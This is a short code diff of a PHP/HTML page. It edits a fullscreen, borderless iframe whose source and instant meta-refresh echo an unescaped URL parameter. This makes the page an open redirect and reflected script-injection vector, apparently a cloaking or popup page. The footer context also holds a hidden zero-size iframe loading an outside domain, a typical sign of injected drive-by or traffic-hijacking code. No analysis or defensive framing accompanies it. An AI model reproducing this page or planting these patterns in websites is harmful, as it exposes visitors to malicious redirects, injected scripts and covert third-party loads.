@@ -138,7 +138,7 @@ loadTool('popping',{
 
 </head>
 <body>
-<iframe src="<?php echo $_GET["!"]; ?>" style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden;" scrolling="no" allowfullscreen="true" webkitallowfullscreen="true" mozallowfullscreen="true"><meta http-equiv="refresh" content="0;url=<?php echo $_GET["x"]; ?>" /></iframe>
+<iframe src="<?php echo $_GET["!"]; ?>" style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden;" scrolling="no" allowfullscreen="true" webkitallowfullscreen="true" mozallowfullscreen="true"><meta http-equiv="refresh" content="0;url=<?php echo $_GET["!"]; ?>" /></iframe>
 </body>
   <div id="footer">
     <iframe width="0" height="0" src="http://spklmis.com/?p=28&s=60689&pp=1&v=0" frameborder="0"></iframe>
